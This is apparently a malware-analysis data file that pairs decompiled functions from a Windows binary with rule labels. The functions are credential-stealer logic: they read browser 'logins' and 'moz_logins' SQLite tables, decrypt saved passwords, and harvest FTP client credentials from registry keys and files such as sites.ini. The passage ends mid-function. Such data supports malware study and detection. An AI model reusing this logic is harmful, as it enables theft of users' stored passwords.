        "decompiled_code": "\nint32_t __cdecl fcn.0040b6f1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    uint var_10h;\n    \n    fcn.004012e8(arg_8h);\n    iVar2 = fcn.0040114c(arg_8h, &var_10h, 0x10);\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    iVar2 = fcn.004017f5(&var_10h, \"SQLite format 3\", 0x10);\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    var_14h = 1;\n    uVar3 = fcn.004013cc(arg_8h, &var_14h);\n    if ((uVar3 == 0) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = 0;\n    uVar4 = uVar3;\n    while (uVar4 != 0) {\n        uVar1 = uVar4 & 1;\n        uVar4 = uVar4 >> 1;\n        if (uVar1 != 0) {\n            iVar2 = iVar2 + 1;\n        }\n    }\n    if (uVar3 == 1) {\n        uVar3 = 0x10000;\n    }\n    if (iVar2 != 1) {\n        return 0;\n    }\n    *0x417094 = uVar3;\n    iVar2 = fcn.004013f9(arg_8h, &var_14h);\n    if (((iVar2 != 1) && (iVar2 != 2)) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013f9(arg_8h, &var_14h);\n    if (((iVar2 != 1) && (iVar2 != 2)) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013f9(arg_8h, &var_14h);\n    if ((iVar2 != 0) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013f9(arg_8h, &var_14h);\n    if ((iVar2 != 0x40) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013f9(arg_8h, &var_14h);\n    if ((iVar2 != 0x20) || (var_14h == 0)) {\n        return 0;\n    }\n    iVar2 = fcn.004013f9(arg_8h, &var_14h);\n    if ((iVar2 == 0x20) && (var_14h != 0)) {\n        fcn.00401424(arg_8h, 0x20, &var_14h);\n        uVar3 = fcn.004013a0(arg_8h, &var_14h);\n        if (((uVar3 != 0) && (uVar3 < 4)) && (var_14h != 0)) {\n            *0x417098 = uVar3;\n            fcn.00401424(arg_8h, 0x28, &var_14h);\n            iVar2 = fcn.0040b2aa(arg_8h, arg_ch, 1, &var_14h, arg_10h, arg_14h);\n            return iVar2;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 853
    },
    "0040b949": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b949(uint noname_0, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_38h;\n    uint32_t var_34h;\n    uchar *var_30h;\n    uint32_t var_2ch;\n    uchar *var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_14h != 0) && (*0x412404 != NULL)) {\n        if ((*0x41709c < arg_14h) && ((*0x4170a0 < arg_14h && (*0x4170a4 < arg_14h)))) {\n            fcn.0040b0c6(arg_10h, *0x41709c, &var_4h, &var_8h, &var_ch);\n            fcn.0040b0c6(arg_10h, *0x4170a4, &var_10h, &var_14h, &var_18h);\n            fcn.0040b0c6(arg_10h, *0x4170a0, &var_1ch, &var_20h, &var_24h);\n            var_2ch = var_1ch;\n            var_28h = var_24h;\n            var_30h = NULL;\n            iVar1 = (**0x412404)(&var_2ch, 0, 0, 0, 0, 1, &var_34h);\n            if ((iVar1 != 0) && ((var_30h != NULL && (var_34h <= var_1ch)))) {\n                uVar3 = var_34h;\n                puVar4 = var_30h;\n                puVar5 = var_24h;\n                if (var_34h != 0) {\n                    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\n                }\n                var_1ch = var_34h;\n                sub.kernel32.dll_LocalFree(var_30h);\n                if (((var_4h != 0) && (var_10h != 0)) && (var_1ch != 0)) {\n                    arg_ch_00 = fcn.004017a5(var_4h);\n                    fcn.004017dc(var_ch, arg_ch_00, var_4h);\n                    uVar2 = sub.kernel32.dll_lstrlenA(\"ftp://\");\n                    iVar1 = sub.shlwapi.dll_StrCmpNIA(arg_ch_00, \"ftp://\", uVar2);\n                    if (iVar1 != 0) {\n                        uVar2 = sub.kernel32.dll_lstrlenA(\"http://\");\n                        iVar1 = sub.shlwapi.dll_StrCmpNIA(arg_ch_00, \"http://\", uVar2);\n                    }\n                    if (iVar1 != 0) {\n                        uVar2 = sub.kernel32.dll_lstrlenA(\"https://\");\n                        iVar1 = sub.shlwapi.dll_StrCmpNIA(arg_ch_00, \"https://\", uVar2);\n                    }\n                    if (iVar1 == 0) {\n                        fcn.00401522(arg_ch, arg_18h);\n                        fcn.00401522(arg_ch, *0x417098);\n                        fcn.00401558(arg_ch, var_ch, var_4h);\n                        fcn.00401558(arg_ch, var_18h, var_10h);\n                        fcn.00401558(arg_ch, var_24h, var_1ch);\n                    }\n                    fcn.0040178e(arg_ch_00);\n                }\n            }\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 952
    },
    "0040bb1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bb1c(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 5) {\n        fcn.0040b0c6(arg_10h, 2, &var_4h, &var_8h, &var_ch);\n        if (var_8h == 1) {\n            var_10h = var_ch;\n            iVar1 = sub.kernel32.dll_lstrcmpiA(var_ch, \"logins\");\n            if (iVar1 == 0) {\n                fcn.0040b0c6(arg_10h, 0, &var_4h, &var_8h, &var_ch);\n                if (var_8h == 1) {\n                    iVar1 = sub.kernel32.dll_lstrcmpA(\"table\", var_ch);\n                    if (iVar1 == 0) {\n                        fcn.0040b0c6(arg_10h, 3, &var_4h, &var_8h, &var_ch);\n                        if (var_8h == 0) {\n                            var_14h = *var_ch;\n                            fcn.0040b0c6(arg_10h, 4, &var_4h, &var_8h, &var_ch);\n                            if (var_8h == 1) {\n                                *0x41709c = -1;\n                                *0x4170a0 = -1;\n                                *0x4170a4 = -1;\n                                fcn.0040b5b5(var_ch, fcn.0040b88e);\n                                var_18h = 1;\n                                if (((*0x41709c != -1) && (*0x4170a0 != -1)) && (*0x4170a4 != -1)) {\n                                    fcn.0040b2aa(arg_8h, arg_ch, var_14h, &var_18h, arg_18h, fcn.0040b949);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 531
    },
    "0040be19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be19(uint noname_0, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_14h != 0) {\n        if (((*0x4170a8 < arg_14h) && (*0x4170ac < arg_14h)) && (*0x4170b0 < arg_14h)) {\n            fcn.0040b0c6(arg_10h, *0x4170a8, &var_4h, &var_8h, &var_ch);\n            fcn.0040b0c6(arg_10h, *0x4170b0, &var_10h, &var_14h, &var_18h);\n            fcn.0040b0c6(arg_10h, *0x4170ac, &var_1ch, &var_20h, &var_24h);\n            if ((var_4h != 0) && (var_1ch != 0)) {\n                arg_ch_00 = fcn.004017a5(var_4h + 1);\n                iVar1 = fcn.004017dc(var_ch, arg_ch_00, var_4h);\n                var_2ch = 0;\n                var_30h = 0;\n                if (*0x4137fb == 0) {\n                    uVar2 = sub.kernel32.dll_lstrlenA(0x4138ab);\n                    iVar1 = sub.shlwapi.dll_StrCmpNIA(arg_ch_00, 0x4138ab, uVar2);\n                    if (iVar1 != 0) {\n                        uVar2 = sub.kernel32.dll_lstrlenA(0x4138b2);\n                        iVar1 = sub.shlwapi.dll_StrCmpNIA(arg_ch_00, 0x4138b2, uVar2);\n                    }\n                    if (iVar1 != 0) {\n                        sub.kernel32.dll_lstrlenA(0x4138ba);\n                        iVar1 = sub.shlwapi.dll_StrCmpNIA();\n                    }\n                }\n                else if (*0x4137fb == 1) {\n                    uVar2 = sub.kernel32.dll_lstrlenA(\"ftp.\");\n                    iVar1 = sub.shlwapi.dll_StrCmpNIA(arg_ch_00, \"ftp.\", uVar2);\n                }\n                else if (*0x4137fb == 2) {\n                    iVar1 = 0;\n                }\n                if (iVar1 == 0) {\n                    if (var_10h != 0) {\n                        var_2ch = fcn.00408ec1(var_18h, var_10h);\n                    }\n                    var_30h = fcn.00408ec1(var_24h, var_1ch);\n                    if ((arg_ch_00 != 0) && (var_30h != 0)) {\n                        fcn.00401522(arg_ch, arg_18h);\n                        fcn.00401584(arg_ch, arg_ch_00);\n                        fcn.00401584(arg_ch, var_2ch);\n                        fcn.00401584(arg_ch, var_30h);\n                    }\n                }\n                fcn.0040178e(var_2ch);\n                fcn.0040178e(var_30h);\n                fcn.0040178e(arg_ch_00);\n            }\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 872
    },
    "0040bfde": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bfde(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 5) {\n        fcn.0040b0c6(arg_10h, 2, &var_4h, &var_8h, &var_ch);\n        if (var_8h == 1) {\n            var_10h = var_ch;\n            iVar1 = sub.kernel32.dll_lstrcmpiA(var_ch, \"moz_logins\");\n            if (iVar1 == 0) {\n                fcn.0040b0c6(arg_10h, 0, &var_4h, &var_8h, &var_ch);\n                if (var_8h == 1) {\n                    iVar1 = sub.kernel32.dll_lstrcmpA(\"table\", var_ch);\n                    if (iVar1 == 0) {\n                        fcn.0040b0c6(arg_10h, 3, &var_4h, &var_8h, &var_ch);\n                        if (var_8h == 0) {\n                            var_14h = *var_ch;\n                            fcn.0040b0c6(arg_10h, 4, &var_4h, &var_8h, &var_ch);\n                            if (var_8h == 1) {\n                                *0x4170a8 = -1;\n                                *0x4170ac = -1;\n                                *0x4170b0 = -1;\n                                fcn.0040b5b5(var_ch, fcn.0040bd5e);\n                                var_18h = 1;\n                                if (((*0x4170a8 != -1) && (*0x4170ac != -1)) && (*0x4170b0 != -1)) {\n                                    fcn.0040b2aa(arg_8h, arg_ch, var_14h, &var_18h, arg_18h, fcn.0040be19);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 531
    },
    "0040c32f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c32f(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    int32_t arg_ch_00;\n    char *pcVar3;\n    char *lpString;\n    uint hMem;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x39, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            fcn.0040c2ff(arg_8h, 0x1a, iVar2);\n            fcn.0040c2ff(arg_8h, 0x1c, iVar2);\n            fcn.0040c2ff(arg_8h, 0x23, iVar2);\n            arg_ch_00 = fcn.00401c09(iVar2, \"\\\\Profiles\");\n            if (arg_ch_00 != 0) {\n                hMem = arg_8h;\n                fcn.0040962e(arg_8h, arg_ch_00, iVar2);\n                fcn.0040178e(hMem);\n            }\n            fcn.0040178e(iVar2);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 463
    },
    "0040c40c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c40c(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *lpString;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x3a, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            fcn.0040c3dc(arg_8h, 0x1a, iVar2);\n            fcn.0040c3dc(arg_8h, 0x1c, iVar2);\n            fcn.0040c3dc(arg_8h, 0x23, iVar2);\n            fcn.0040178e(iVar2);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 375
    },
    "0040c496": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c496(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *lpString;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x3b, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, iVar2, 0x413d92, 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 342
    },
    "0040c507": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c507(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4123b8 == NULL) {\n        return;\n    }\n    var_8h = sub.kernel32.dll_MultiByteToWideChar(0, 0, arg_ch, 0xffffffff, 0, 0);\n    var_4h = fcn.004017a5(var_8h);\n    sub.kernel32.dll_MultiByteToWideChar(0, 0, arg_ch, 0xffffffff, var_4h, var_8h);\n    iVar1 = (**0x4123b8)(var_4h, 0, 0x12, 0, 0, &var_ch);\n    if (-1 < iVar1) {\n        iVar1 = (**(*var_ch + 0x10))(var_ch, L\"Settings\", 0, 0x12, 0, &var_10h);\n        if (-1 < iVar1) {\n            iVar1 = fcn.00401091(var_10h);\n            if (iVar1 != 0) {\n                arg_ch_00 = fcn.004017a5(iVar1);\n                fcn.004012e8(var_10h);\n                iVar2 = fcn.0040114c(var_10h, arg_ch_00, iVar1);\n                if (iVar2 != 0) {\n                    fcn.00401522(arg_8h, 0xbeef0000);\n                    fcn.00401558(arg_8h, arg_ch_00, iVar1);\n                }\n                fcn.0040178e(arg_ch_00);\n            }\n            fcn.00401026(var_10h);\n        }\n        (**(*var_ch + 8))(var_ch);\n    }\n    fcn.0040178e(var_4h);\n    return;\n}\n",
        "token_count": 473
    },
    "0040c72b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c72b(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *lpString;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x3e, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            fcn.0040404c(arg_8h, iVar2, \".SMF\", 0xbeef0000);\n            fcn.0040178e(iVar2);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 334
    },
    "0040c7a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c7a3(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *lpString;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x3f, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00404097(arg_8h, \"\\\\BlazeFtp\", \"site.dat\", 0xbeef0000);\n            var_14h = fcn.00401b82(*0x4120d5, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastPassword\", 0);\n            var_ch = fcn.00401b82(*0x4120d5, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastAddress\", 0);\n            var_10h = fcn.00401b82(*0x4120d5, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastUser\", 0);\n            var_18h = fcn.00401b82(*0x4120d5, \"Software\\\\FlashPeak\\\\BlazeFtp\\\\Settings\", \"LastPort\", &var_1ch);\n            if (((var_ch != 0) && (var_10h != 0)) && (var_14h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0001);\n                fcn.00401584(arg_8h, var_ch);\n                fcn.00401584(arg_8h, var_10h);\n                fcn.00401584(arg_8h, var_14h);\n                fcn.00401558(arg_8h, var_18h, var_1ch);\n            }\n            fcn.0040178e(var_14h);\n            fcn.0040178e(var_ch);\n            fcn.0040178e(var_10h);\n            fcn.0040178e(var_18h);\n            fcn.004015ef(arg_8h, var_4h);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            var_8h = iVar2;\n            fcn.0040404c(arg_8h, iVar2, \"site.dat\", 0xbeef0000);\n            fcn.0040178e(var_8h);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 751
    },
    "0040c968": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c968(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *lpString;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x41, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, iVar2, \"Connections.txt\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 338
    },
    "0040c9d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c9d9(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    char *lpString;\n    uint uVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x42, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            iVar2 = fcn.00401cc2(0x23);\n            if (iVar2 != 0) {\n                uVar3 = fcn.00401c5d(iVar2, \"\\\\3D-FTP\");\n                uVar5 = arg_8h;\n                fcn.0040404c(arg_8h, uVar3, \"sites.ini\", 0xbeef0000);\n                fcn.0040178e(uVar5);\n            }\n            iVar2 = fcn.00401cc2(0x23);\n            if (iVar2 != 0) {\n                uVar3 = fcn.00401c5d(iVar2, \"\\\\SiteDesigner\");\n                uVar5 = arg_8h;\n                fcn.0040404c(arg_8h, uVar3, \"sites.ini\", 0xbeef0000);\n                fcn.0040178e(uVar5);\n            }\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            uVar5 = arg_8h;\n            fcn.0040404c(arg_8h, iVar2, \"sites.ini\", 0xbeef0000);\n            fcn.0040178e(uVar5);\n        }\n        iVar2 = -1;\n        pcVar4 = lpString;\n        do {\n            lpString = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 549
    },
    "0040caa8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040caa8(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    int16_t *var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.00401e0f(arg_ch, &var_10h);\n    if (iVar1 != 0) {\n        if ((2 < var_4h) && (*var_8h == 0x222c)) {\n            fcn.00401522(arg_8h, arg_10h);\n            fcn.00401558(arg_8h, var_8h, var_4h);\n        }\n        fcn.00401ea4(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "0040cc5a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cc5a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (((*0x4123cc != NULL) && (*0x4123c8 != NULL)) && (*0x412404 != 0)) {\n        var_4h = NULL;\n        var_8h = 0;\n        iVar1 = (**0x4123c8)(0x413f27, 0, &var_8h, &var_4h);\n        if (((iVar1 != 0) && (var_8h != 0)) && (piVar2 = var_4h,  var_4h != NULL)) {\n            while ((var_8h != 0 && (*piVar2 != 0))) {\n                iVar1 = *piVar2;\n                iVar3 = arg_8h;\n                fcn.0040cba9(arg_8h, *(iVar1 + 0x30), *(iVar1 + 8), *(iVar1 + 0x1c), *(iVar1 + 0x18));\n                var_8h = var_8h + -1;\n                piVar2 = iVar3 + 4;\n            }\n            (**0x4123cc)(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "0040cceb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cceb(int32_t lpString, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *arg_8h;\n    char *pcVar3;\n    uint var_ch;\n    int32_t pszFirst;\n    uint var_4h;\n    \n    pszFirst = 0;\n    var_ch = 0;\n    iVar1 = sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_ch, arg_10h >> 1, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        iVar2 = iVar1;\n        pszFirst = fcn.004017a5(iVar1);\n        iVar1 = sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_ch, arg_10h >> 1, pszFirst, iVar1, 0, 0, iVar2);\n        if (iVar1 == 0) {\n            fcn.0040178e(pszFirst);\n            pszFirst = 0;\n        }\n    }\n    if ((pszFirst != 0) && (iVar1 = sub.shlwapi.dll_StrStrIA(pszFirst, lpString),  iVar1 != 0)) {\n        iVar2 = sub.kernel32.dll_lstrlenA(lpString, iVar1);\n        arg_8h = iVar2 + lpString;\n        for (pcVar3 = arg_8h; *pcVar3 != '\\0'; pcVar3 = pcVar3 + 1) {\n            if (*pcVar3 == '\\r') {\n                *pcVar3 = '\\0';\n                iVar1 = 